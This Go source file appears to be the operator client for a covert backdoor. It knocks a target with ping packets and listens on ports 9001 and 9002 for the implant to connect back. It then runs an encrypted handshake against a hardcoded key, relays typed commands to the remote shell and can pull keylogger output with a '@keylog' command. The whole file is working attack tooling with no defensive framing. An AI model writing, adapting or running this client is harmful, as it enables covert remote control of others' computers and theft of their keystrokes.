package main

import (
	"bufio"
	"crypto/rand"
	"crypto/sha512"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/nacl/box"
	"golang.org/x/crypto/nacl/secretbox"
)

const (
	helloMagic = 0xDEFACED
	respMagic  = 0xDEFACDE
	userPort   = 9001
	outPort    = 9002
	maxPkt     = 4096
)

var kitPubHex = "e4353550c44b1c499f46f39454fb703f67265a75899a52f8d04328300dfb7e5e"

func secretNonce(tag byte, ctr uint64) (nonce [24]byte) {
	nonce[0] = tag
	binary.LittleEndian.PutUint64(nonce[8:16], ctr)
	return
}

func readExact(conn net.Conn, n int) ([]byte, error) {
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

func handshake(hello []byte) ([]byte, [32]byte, [32]byte, error) {
	var tx, rx [32]byte
	if len(hello) != 32 || binary.BigEndian.Uint64(hello[:8]) != helloMagic {
		return nil, tx, rx, errors.New("bad hello")
	}

	var nonceR [24]byte
	copy(nonceR[:], hello[8:32])

	pub, priv, err := box.GenerateKey(rand.Reader)
	if err != nil {
		return nil, tx, rx, err
	}

	kitPubRaw, err := hex.DecodeString(kitPubHex)
	if err != nil || len(kitPubRaw) != 32 {
		return nil, tx, rx, errors.New("bad kit public key")
	}
	var kitPub [32]byte
	copy(kitPub[:], kitPubRaw)

	var shared [32]byte
	box.Precompute(&shared, &kitPub, priv)

	ts := make([]byte, 8)
	binary.LittleEndian.PutUint64(ts, uint64(time.Now().Unix()))

	nonceO := make([]byte, 16)
	if _, err := rand.Read(nonceO); err != nil {
		return nil, tx, rx, err
	}

	plain := append(ts, nonceO...)
	sealed := box.Seal(nil, plain, &nonceR, &kitPub, priv)

	resp := make([]byte, 0, 120)
	magic := make([]byte, 8)
	binary.BigEndian.PutUint64(magic, respMagic)
	resp = append(resp, magic...)
	resp = append(resp, ts...)
	resp = append(resp, nonceR[:16]...)
	resp = append(resp, nonceO...)
	resp = append(resp, pub[:]...)
	resp = append(resp, sealed...)

	digest := sha512.Sum512(append(shared[:], pub[:]...))
	copy(rx[:], digest[:32])
	copy(tx[:], digest[32:])
	return resp, tx, rx, nil
}

func knock(target string) {
	cmd := exec.Command("ping", "-c", "3", "-i", "0.2", target)
	cmd.Stdout = io.Discard
	cmd.Stderr = io.Discard
	_ = cmd.Run()
}

func readOutput(conn net.Conn) []byte {
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	var data []byte
	buf := make([]byte, maxPkt)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			break
		}
	}
	return data
}

func show(data []byte) {
	if len(data) == 0 {
		return
	}
	os.Stdout.Write(data)
	if data[len(data)-1] != '\n' {
		fmt.Println()
	}
}

func run(target string, keylogOnly bool) error {
	outListener, err := net.Listen("tcp", fmt.Sprintf(":%d", outPort))
	if err != nil {
		return err
	}
	defer outListener.Close()

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", userPort))
	if err != nil {
		return err
	}
	defer listener.Close()

	knock(target)
	fmt.Fprintln(os.Stderr, "waiting for shellproxy")

	conn, err := listener.Accept()
	if err != nil {
		return err
	}
	defer conn.Close()
	fmt.Fprintf(os.Stderr, "+ ok got %s\n", conn.RemoteAddr())

	hello, err := readExact(conn, 32)
	if err != nil {
		return err
	}
	resp, txKey, rxKey, err := handshake(hello)
	if err != nil {
		return err
	}
	if _, err := conn.Write(resp); err != nil {
		return err
	}
	_ = rxKey
	fmt.Fprintln(os.Stderr, "+ handshake ok")

	var txctr uint64 = 1
	if keylogOnly {
		nonce := secretNonce(0x01, txctr)
		pkt := secretbox.Seal(nil, []byte("@keylog"), &nonce, &txKey)
		frame := make([]byte, 2+len(pkt))
		binary.BigEndian.PutUint16(frame[:2], uint16(len(pkt)))
		copy(frame[2:], pkt)
		if _, err := conn.Write(frame); err != nil {
			return err
		}
		outConn, err := outListener.Accept()
		if err != nil {
			return err
		}
		show(readOutput(outConn))
		outConn.Close()
		return nil
	}
	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Fprint(os.Stderr, "(fresnel)> ")
		if !scanner.Scan() {
			break
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		if line == "exit" {
			break
		}

		nonce := secretNonce(0x01, txctr)
		txctr++
		pkt := secretbox.Seal(nil, []byte(line), &nonce, &txKey)

		frame := make([]byte, 2+len(pkt))
		binary.BigEndian.PutUint16(frame[:2], uint16(len(pkt)))
		copy(frame[2:], pkt)
		if _, err := conn.Write(frame); err != nil {
			return err
		}

		outConn, err := outListener.Accept()
		if err != nil {
			return err
		}
		show(readOutput(outConn))
		outConn.Close()
	}
	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintln(os.Stderr, "./remote <target ip>")
		os.Exit(1)
	}
	keylogOnly := filepath.Base(os.Args[0]) == "log"
	if err := run(os.Args[1], keylogOnly); err != nil {
		fmt.Fprintf(os.Stderr, "!!!!! %s\n", err)
		os.Exit(1)
	}
}
